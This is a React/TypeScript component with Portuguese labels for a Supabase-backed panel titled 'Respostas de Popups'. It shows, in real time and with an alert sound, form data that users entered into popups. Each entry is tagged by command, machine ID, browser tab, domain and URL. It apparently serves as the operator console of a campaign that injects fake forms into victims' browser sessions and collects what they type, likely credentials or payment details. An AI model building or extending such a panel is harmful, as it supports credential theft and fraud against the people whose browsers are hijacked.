import { useState, useEffect, useRef } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Clock, CheckCircle, AlertCircle, Eye } from "lucide-react";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";

interface PopupResponse {
  id: string;
  command_id: string;
  machine_id: string;
  tab_id: string;
  domain: string;
  url: string;
  form_data: any;
  is_read: boolean;
  viewed_by: string | null;
  viewed_at: string | null;
  created_at: string;
}

interface PopupResponsesPanelProps {
  onNewResponse?: () => void;
}

const PopupResponsesPanel = ({ onNewResponse }: PopupResponsesPanelProps) => {
  const [responses, setResponses] = useState<PopupResponse[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedResponse, setSelectedResponse] = useState<PopupResponse | null>(null);
  const [audioContext, setAudioContext] = useState<AudioContext | null>(null);
  const [showOnlyUnread, setShowOnlyUnread] = useState(true);
  const channelRef = useRef<any>(null);

  useEffect(() => {
    // Initialize audio context
    const context = new (window.AudioContext || (window as any).webkitAudioContext)();
    setAudioContext(context);

    fetchResponses();
    setupRealtimeSubscription();
    
    return () => {
      if (channelRef.current) {
        console.log('🔌 Removendo subscription...');
        supabase.removeChannel(channelRef.current);
        channelRef.current = null;
      }
    };
  }, []);

  const fetchResponses = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('popup_responses')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(100);

    if (error) {
      console.error('Error fetching popup responses:', error);
      toast.error('Erro ao carregar respostas');
      return;
    }

    setResponses(data || []);
    setLoading(false);
  };

  const setupRealtimeSubscription = () => {
    console.log('🔌 Configurando subscription para popup_responses...');
    
    // Clean up existing channel before creating new one
    if (channelRef.current) {
      console.log('🧹 Limpando channel anterior...');
      supabase.removeChannel(channelRef.current);
      channelRef.current = null;
    }
    
    const channel = supabase
      .channel('popup-responses-changes')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'popup_responses'
        },
        (payload) => {
          console.log('📥 INSERT recebido:', payload);
          const newResponse = payload.new as PopupResponse;
          
          // Play alert sound
          playAlertSound();
          
          // Show toast notification
          toast.success('🎯 Nova Resposta Recebida!', {
            description: `Domínio: ${newResponse.domain}`,
            duration: 8000,
          });

          // Add to list (check for duplicates)
          setResponses(prev => {
            const exists = prev.find(r => r.id === newResponse.id);
            if (exists) {
              console.log('⚠️ Resposta duplicada ignorada:', newResponse.id);
              return prev;
            }
            return [newResponse, ...prev];
          });
          
          // Callback
          if (onNewResponse) {
            onNewResponse();
          }
        }
      )
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'popup_responses'
        },
        (payload) => {
          console.log('🔄 UPDATE recebido:', payload);
          const updatedResponse = payload.new as PopupResponse;
          
          // Update in list
          setResponses(prev => 
            prev.map(r => r.id === updatedResponse.id ? updatedResponse : r)
          );
          
          // Show toast only if marked as read by someone else
          if (updatedResponse.is_read && payload.old && !(payload.old as any).is_read) {
            toast.info('✅ Resposta marcada como lida', {
              description: `Domínio: ${updatedResponse.domain}`,
            });
          }
        }
      )
      .subscribe((status) => {
        console.log('📡 Status da subscription:', status);
        
        if (status === 'SUBSCRIBED') {
          console.log('✅ Subscription ativa para popup_responses');
          channelRef.current = channel;
        } else if (status === 'CHANNEL_ERROR') {
          console.error('❌ Erro na subscription, limpando e reconectando...');
          // Clean up before retry
          if (channelRef.current) {
            supabase.removeChannel(channelRef.current);
            channelRef.current = null;
          }
          setTimeout(() => {
            console.log('🔄 Reconectando subscription...');
            setupRealtimeSubscription();
          }, 3000);
        }
      });
  };

  const playAlertSound = () => {
    if (!audioContext) return;

    const playBeep = (frequency: number, startTime: number, duration: number) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();

      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);

      oscillator.frequency.value = frequency;
      oscillator.type = 'sine';

      gainNode.gain.setValueAtTime(0, startTime);
      gainNode.gain.linearRampToValueAtTime(0.3, startTime + 0.01);
      gainNode.gain.exponentialRampToValueAtTime(0.001, startTime + duration);

      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    };

    const now = audioContext.currentTime;
    playBeep(800, now, 0.2);
    playBeep(1000, now + 0.25, 0.2);
    playBeep(1200, now + 0.5, 0.4);
  };

  const markAsRead = async (responseId: string) => {
    const { data: user } = await supabase.auth.getUser();
    
    const { error } = await supabase
      .from('popup_responses')
      .update({ 
        is_read: true, 
        viewed_by: user.user?.id,
        viewed_at: new Date().toISOString()
      })
      .eq('id', responseId);

    if (error) {
      toast.error('Erro ao marcar como lido');
      return;
    }

    setResponses(prev => 
      prev.map(r => r.id === responseId ? { ...r, is_read: true, viewed_by: user.user?.id, viewed_at: new Date().toISOString() } : r)
    );
    
    toast.success('Marcado como lido');
  };

  const unreadCount = responses.filter(r => !r.is_read).length;
  const filteredResponses = showOnlyUnread 
    ? responses.filter(r => !r.is_read)
    : responses;

  return (
    <>
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2">
                <AlertCircle className="h-5 w-5" />
                Respostas de Popups
                {unreadCount > 0 && (
                  <Badge variant="destructive" className="ml-2">
                    {unreadCount} {unreadCount === 1 ? 'nova' : 'novas'}
                  </Badge>
                )}
              </CardTitle>
              <CardDescription>
                Formulários preenchidos pelos usuários em tempo real
              </CardDescription>
            </div>
            <div className="flex gap-2">
              <Button 
                variant="outline" 
                size="sm"
                onClick={() => setShowOnlyUnread(!showOnlyUnread)}
              >
                {showOnlyUnread ? 'Mostrar Todas' : 'Apenas Não Lidas'}
              </Button>
              <Button 
                variant="outline" 
                size="sm"
                onClick={fetchResponses}
              >
                Atualizar
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          {loading ? (
            <div className="text-center py-8 text-muted-foreground">
              Carregando respostas...
            </div>
          ) : filteredResponses.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              {showOnlyUnread 
                ? 'Nenhuma resposta não lida' 
                : 'Nenhuma resposta recebida ainda'}
            </div>
          ) : (
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Status</TableHead>
                  <TableHead>Máquina</TableHead>
                  <TableHead>Domínio</TableHead>
                  <TableHead>Data/Hora</TableHead>
                  <TableHead>Ações</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredResponses.map((response) => (
                  <TableRow
                    key={response.id}
                    className={!response.is_read ? 'bg-primary/5 font-medium' : ''}
                  >
                    <TableCell>
                      {!response.is_read ? (
                        <Badge variant="default" className="animate-pulse">
                          NOVO
                        </Badge>
                      ) : (
                        <Badge variant="outline">
                          <CheckCircle className="h-3 w-3 mr-1" />
                          Lido
                        </Badge>
                      )}
                    </TableCell>
                    <TableCell className="font-mono text-sm">
                      {response.machine_id}
                    </TableCell>
                    <TableCell>
                      <Badge variant="secondary">{response.domain}</Badge>
                    </TableCell>
                    <TableCell>
                      <div className="flex items-center gap-2 text-sm">
                        <Clock className="h-3 w-3" />
                        {new Date(response.created_at).toLocaleString('pt-BR')}
                      </div>
                    </TableCell>
                    <TableCell>
                      <div className="flex gap-2">
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => setSelectedResponse(response)}
                        >
                          <Eye className="h-3 w-3 mr-1" />
                          Ver Dados
                        </Button>
                        {!response.is_read && (
                          <Button
                            size="sm"
                            variant="default"
                            onClick={() => markAsRead(response.id)}
                          >
                            <CheckCircle className="h-3 w-3 mr-1" />
                            Marcar Lido
                          </Button>
                        )}
                      </div>
                    </TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          )}
        </CardContent>
      </Card>

      {/* Response Details Modal */}
      <Dialog open={!!selectedResponse} onOpenChange={() => setSelectedResponse(null)}>
        <DialogContent className="max-w-2xl">
          <DialogHeader>
            <DialogTitle>Detalhes da Resposta</DialogTitle>
            <DialogDescription>
              Dados preenchidos pelo usuário no formulário
            </DialogDescription>
          </DialogHeader>
          
          {selectedResponse && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4 text-sm">
                <div>
                  <span className="font-medium">Máquina:</span>
                  <p className="font-mono">{selectedResponse.machine_id}</p>
                </div>
                <div>
                  <span className="font-medium">Domínio:</span>
                  <p className="font-mono">{selectedResponse.domain}</p>
                </div>
                <div className="col-span-2">
                  <span className="font-medium">URL:</span>
                  <p className="font-mono text-xs break-all">{selectedResponse.url}</p>
                </div>
                <div>
                  <span className="font-medium">Data/Hora:</span>
                  <p>{new Date(selectedResponse.created_at).toLocaleString('pt-BR')}</p>
                </div>
              </div>

              <div className="border-t pt-4">
                <h4 className="font-medium mb-3">Dados do Formulário:</h4>
                <div className="space-y-3">
                  {Object.entries(selectedResponse.form_data).map(([key, value]) => (
                    <div key={key} className="bg-muted/50 p-3 rounded-lg">
                      <div className="text-xs text-muted-foreground mb-1 font-mono">
                        {key}
                      </div>
                      <div className="font-medium">
                        {typeof value === 'object' ? JSON.stringify(value, null, 2) : String(value)}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </>
  );
};

export default PopupResponsesPanel;